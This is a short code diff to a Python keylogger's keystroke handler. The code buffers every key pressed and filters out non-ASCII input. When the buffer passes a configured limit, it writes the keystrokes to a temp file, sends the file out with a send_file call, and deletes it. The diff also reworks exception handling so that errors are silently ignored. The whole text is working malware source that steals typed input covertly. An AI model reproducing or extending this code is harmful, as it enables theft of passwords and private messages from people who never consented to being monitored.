@@ -126,22 +126,22 @@ def on_press(key):
                 knew = '\n'
             else:
                 knew = ''
+        if not knew.isascii():
+            knew = ''
         key_buffer += knew
-    except :
-        pass
-    if len(key_buffer) > int(config["main"]["keylimit"]):
-        fname = os.environ["TEMP"]+"/"+str(time.time())+".txt".replace("\\","/")
-        f = open(fname,"w")
-        f.write(key_buffer)
-        f.flush()
-        f.close()
-        send_file(fname,caption)
-        try:
+        if len(key_buffer) > int(config["main"]["keylimit"]):
+            fname = os.environ["TEMP"]+"/"+str(time.time())+".txt".replace("\\","/")
+            f = open(fname,"w")
+            f.write(key_buffer)
+            f.flush()
+            f.close()
+            send_file(fname,caption)
             time.sleep(3)
             os.unlink(fname)
-        except:
-            pass
-        key_buffer = ""
+            key_buffer = ""
+    except:
+        pass
+        
 
 
 def init_keylogger():
